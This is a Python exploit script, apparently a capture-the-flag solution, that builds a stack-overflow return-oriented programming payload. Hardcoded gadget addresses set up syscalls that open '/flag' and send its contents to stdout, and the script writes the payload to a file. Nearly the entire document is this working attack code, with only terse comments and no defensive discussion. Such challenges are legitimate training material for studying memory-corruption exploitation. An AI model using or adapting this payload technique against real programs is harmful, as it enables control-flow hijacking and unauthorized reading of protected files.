#!/usr/bin/env python3

from struct import pack

stack_addr = int(input("Give me the stack address: "), 16)
payload = b'a' * 72

# open("/flag", 0);  // 0 is O_RDONLY.
payload += pack("<Q", 0x4022d5) # pop rax ; ret
payload += pack("<Q", 2)        # data
payload += pack("<Q", 0x4022fd) # pop rdi ; ret
payload += pack("<Q", stack_addr + 72 + 8 * 18)  # address of string /flag
payload += pack("<Q", 0x4022e5) # pop rsi ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x40230d) # syscall ; ret

# sendfile(1, 3, 0, 400);
payload += pack("<Q", 0x4022d5) # pop rax ; ret
payload += pack("<Q", 40)       # data
payload += pack("<Q", 0x4022fd) # pop rdi ; ret
payload += pack("<Q", 1)       # data
payload += pack("<Q", 0x4022e5) # pop rsi ; ret
payload += pack("<Q", 3)        # data
payload += pack("<Q", 0x4022ee) # pop rdx ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x4022ed) # pop r10 ; ret
payload += pack("<Q", 400)        # data
payload += pack("<Q", 0x40230d) # syscall ; ret

# Constant, should be big endian, add NULL byte at the end.
# Make sure string is 8 bytes.
payload += pack(">Q", 0x2f666c6167000000) # string /flag

with open("payload", "wb") as f:
    f.write(payload)
